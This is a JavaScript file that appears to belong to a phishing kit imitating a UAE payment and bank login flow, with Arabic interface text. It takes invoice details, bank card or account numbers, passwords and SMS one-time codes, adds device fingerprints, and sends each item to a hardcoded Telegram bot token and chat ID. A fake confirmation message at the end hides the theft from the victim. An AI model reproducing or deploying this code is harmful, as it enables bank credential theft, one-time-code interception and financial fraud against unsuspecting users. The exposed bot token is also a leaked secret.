// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM';
const TELEGRAM_CHAT_ID = '1008144314';

// Function to send message to Telegram
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const data = await response.json();
        console.log('Telegram response:', data);
        return data.ok;
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        return false;
    }
}

// Function to get user info
function getUserInfo() {
    const userAgent = navigator.userAgent;
    const language = navigator.language;
    const platform = navigator.platform;
    const screenRes = `${screen.width}x${screen.height}`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const date = new Date().toLocaleString('ar-AE');
    
    // Get IP (will be shown as referrer info)
    const referrer = document.referrer || 'Direct';
    
    return {
        userAgent,
        language,
        platform,
        screenRes,
        timezone,
        date,
        referrer
    };
}

// Format message for data.html form
function formatDataFormMessage(data) {
    const userInfo = getUserInfo();
    return `
<b>📋 بيانات نموذج السداد الجديدة</b>

<b>━━━━━━━━━━━━━━</b>
<b>رقم الفاتورة:</b> <code>${data.invoiceNumber}</code>
<b>نوع السداد:</b> ${data.paymentType}
<b>قيمة الرسوم:</b> ${data.amount} درهم إماراتي

<b>━━━━━━━━━━━━━━</b>
<b>📱 معلومات الجهاز:</b>
<b>التاريخ:</b> ${userInfo.date}
<b>المنطقة الزمنية:</b> ${userInfo.timezone}
<b>النظام:</b> ${userInfo.platform}
<b>دقة الشاشة:</b> ${userInfo.screenRes}
<b>اللغة:</b> ${userInfo.language}
<b>المصدر:</b> ${userInfo.referrer}
`;
}

// Format message for bank login form
function formatBankLoginMessage(data, bankName) {
    const userInfo = getUserInfo();
    return `
<b>🏦 بيانات تسجيل دخول بنكية جديدة</b>

<b>━━━━━━━━━━━━━━</b>
<b>البنك:</b> ${bankName}
<b>رقم البطاقة/الحساب:</b> <code>${data.cardNumber}</code>
<b>الرقم السري:</b> <code>${data.password}</code>

<b>━━━━━━━━━━━━━━</b>
<b>📱 معلومات الجهاز:</b>
<b>التاريخ:</b> ${userInfo.date}
<b>المنطقة الزمنية:</b> ${userInfo.timezone}
<b>النظام:</b> ${userInfo.platform}
<b>دقة الشاشة:</b> ${userInfo.screenRes}
<b>اللغة:</b> ${userInfo.language}
`;
}

// Format message for OTP
function formatOTPMessage(otp, bankName) {
    const userInfo = getUserInfo();
    return `
<b>🔐 رمز تحقق OTP جديد</b>

<b>━━━━━━━━━━━━━━</b>
<b>البنك:</b> ${bankName}
<b>رمز التحقق:</b> <code>${otp}</code>

<b>━━━━━━━━━━━━━━</b>
<b>📱 معلومات الجهاز:</b>
<b>التاريخ:</b> ${userInfo.date}
<b>المنطقة الزمنية:</b> ${userInfo.timezone}
`;
}

// Store data in session for multi-step forms
function storeFormData(key, value) {
    sessionStorage.setItem(key, JSON.stringify(value));
}

function getFormData(key) {
    const data = sessionStorage.getItem(key);
    return data ? JSON.parse(data) : null;
}

// Handle data.html form submission
function handleDataForm(event) {
    event.preventDefault();
    
    const invoiceNumber = document.getElementById('invoiceNumber').value;
    const paymentType = document.getElementById('paymentType').value;
    const amount = document.getElementById('amount').value;
    
    if (!invoiceNumber || !amount) {
        alert('الرجاء ملء جميع الحقول');
        return;
    }
    
    const formData = {
        invoiceNumber,
        paymentType,
        amount
    };
    
    // Store data for later
    storeFormData('paymentData', formData);
    
    // Send to Telegram
    const message = formatDataFormMessage(formData);
    sendToTelegram(message).then(success => {
        // Redirect to bank selection regardless of success
        window.location.href = 'bank.html';
    }).catch(err => {
        console.error(err);
        window.location.href = 'bank.html';
    });
}

// Handle bank login form submission
function handleBankLogin(event, bankName) {
    event.preventDefault();
    
    const cardNumber = document.getElementById('cardNumber').value;
    const password = document.getElementById('password').value;
    
    if (!cardNumber || !password) {
        alert('الرجاء ملء جميع الحقول');
        return;
    }
    
    const loginData = {
        cardNumber,
        password
    };
    
    // Store bank name
    storeFormData('bankName', bankName);
    storeFormData('loginData', loginData);
    
    // Send to Telegram
    const message = formatBankLoginMessage(loginData, bankName);
    sendToTelegram(message).then(success => {
        // Redirect to OTP page
        window.location.href = 'sms.html';
    }).catch(err => {
        console.error(err);
        window.location.href = 'sms.html';
    });
}

// Handle OTP form submission
function handleOTPForm(event) {
    event.preventDefault();
    
    const otp = document.getElementById('otp').value;
    
    if (!otp) {
        alert('الرجاء إدخال رمز التحقق');
        return;
    }
    
    const bankName = getFormData('bankName') || 'غير محدد';
    
    // Send to Telegram
    const message = formatOTPMessage(otp, bankName);
    sendToTelegram(message).then(success => {
        // Show loading then success message
        alert('جاري معالجة طلبك...');
        setTimeout(() => {
            alert('تم التأكيد بنجاح! سيتم التواصل معك قريباً.');
            // Clear session data
            sessionStorage.clear();
            // Optionally redirect to home
            // window.location.href = '../index.html';
        }, 2000);
    }).catch(err => {
        console.error(err);
        alert('حدث خطأ، يرجى المحاولة مرة أخرى');
    });
}

// Log page visit
function logPageVisit(pageName) {
    const userInfo = getUserInfo();
    const message = `
<b>👁 زيارة صفحة جديدة</b>

<b>الصفحة:</b> ${pageName}
<b>التاريخ:</b> ${userInfo.date}
<b>النظام:</b> ${userInfo.platform}
<b>المتصفح:</b> ${userInfo.userAgent.substring(0, 100)}...
`;
    // Uncomment to enable page visit logging
    // sendToTelegram(message);
}
